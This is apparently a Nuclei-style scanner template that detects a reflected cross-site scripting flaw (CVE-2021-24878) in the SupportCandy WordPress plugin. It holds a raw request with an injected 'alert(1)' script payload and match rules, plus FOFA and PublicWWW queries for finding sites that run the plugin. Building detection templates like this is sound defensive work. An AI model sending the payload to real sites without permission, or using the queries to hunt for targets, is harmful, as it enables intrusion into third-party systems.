http:
- matchers:
  - condition: and
    type: word
    words:
    - 'var attrs = {};alert(1)//:'
    - wpsc_create_ticket_init
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /?};alert(1)// HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-24878
info:
  author: popcorn94
  classification:
    cpe: cpe:2.3:a:supportcandy:supportcandy:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-24878
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.74518
    epss-score: 0.00864
  description: 'The SupportCandy WordPress plugin before 2.2.7 does not sanitise and
    escape the query string before outputting it back in pages with the [wpsc_create_ticket]
    shortcode embed, leading to a Reflected Cross-Site Scripting issue

    '
  impact: 'Attackers can inject malicious JavaScript via reflected XSS in pages with
    wpsc_create_ticket shortcode, potentially stealing user session cookies or manipulating
    support ticket data.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/supportcandy/"
    framework: wordpress
    max-request: 1
    product: supportcandy
    publicwww-query: /wp-content/plugins/supportcandy/
    vendor: supportcandy
    verified: true
  name: SupportCandy < 2.2.7 - Reflected Cross-Site Scripting
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24878
  - https://github.com/andrewcy86/supportcandy(plugin)
  - https://wpscan.com/vulnerability/d2f1fd60-5e5e-4e38-9559-ba2d14ae37bf/
  remediation: Fixed in 2.2.7
  severity: medium
  tags: cve,cve2021,wordpress,wpscan,wp-plugin,supportcandy,xss,vkev,vuln
